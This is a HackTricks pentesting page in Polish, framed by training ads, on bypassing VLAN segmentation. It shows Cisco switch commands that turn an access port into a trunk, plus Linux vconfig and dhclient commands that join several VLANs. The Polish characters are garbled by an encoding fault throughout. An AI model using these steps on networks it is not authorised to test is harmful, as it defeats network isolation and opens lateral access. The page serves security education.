# Lateral VLAN Segmentation Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Jeli dostp do przecznika jest bezporedni, segmentacja VLAN mo偶e by obejciem. Obejmuje to ponowne skonfigurowanie podczonego portu w trybie trunk, utworzenie wirtualnych interfejs贸w dla docelowych VLAN-贸w oraz ustawienie adres贸w IP, zar贸wno dynamicznie (DHCP), jak i statycznie, w zale偶noci od scenariusza (**po wicej szczeg贸贸w sprawd藕 [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)).**

Pocztkowo konieczne jest zidentyfikowanie konkretnego podczonego portu. Zazwyczaj mo偶na to osign za pomoc komunikat贸w CDP lub poprzez wyszukiwanie portu za pomoc maski **include**.

**Jeli CDP nie dziaa, identyfikacj portu mo偶na spr贸bowa przeprowadzi, wyszukujc adres MAC**:
```
SW1(config)# show mac address-table | include 0050.0000.0500
```
Przed przeczeniem na tryb trunk, nale偶y sporzdzi list istniejcych VLAN-贸w oraz okreli ich identyfikatory. Te identyfikatory s nastpnie przypisywane do interfejsu, co umo偶liwia dostp do r贸偶nych VLAN-贸w przez trunk. Port w u偶yciu, na przykad, jest powizany z VLAN 10.
```
SW1# show vlan brief
```
**Przejcie w tryb trunk wymaga wejcia w tryb konfiguracji interfejsu**:
```
SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
```
Przeczenie na tryb trunk spowoduje tymczasowe zak贸cenie cznoci, ale mo偶na to p贸藕niej przywr贸ci.

Nastpnie tworzone s wirtualne interfejsy, przypisywane s identyfikatory VLAN i aktywowane:
```bash
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 50
sudo vconfig add eth0 60
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.50 up
sudo ifconfig eth0.60 up
```
Nastpnie 偶danie adresu jest wysyane za porednictwem DHCP. Alternatywnie, w przypadkach, gdy DHCP nie jest mo偶liwe, adresy mo偶na skonfigurowa rcznie:
```bash
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20
sudo dhclient -v eth0.50
sudo dhclient -v eth0.60
```
Przykad rcznego ustawiania statycznego adresu IP na interfejsie (VLAN 10):
```bash
sudo ifconfig eth0.10 10.10.10.66 netmask 255.255.255.0
```
czno jest testowana poprzez inicjowanie 偶da ICMP do domylnych bramek dla VLAN-贸w 10, 20, 50 i 60.

Ostatecznie, ten proces umo偶liwia obejcie segmentacji VLAN, co uatwia nieograniczony dostp do ka偶dej sieci VLAN i przygotowuje grunt pod kolejne dziaania.

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
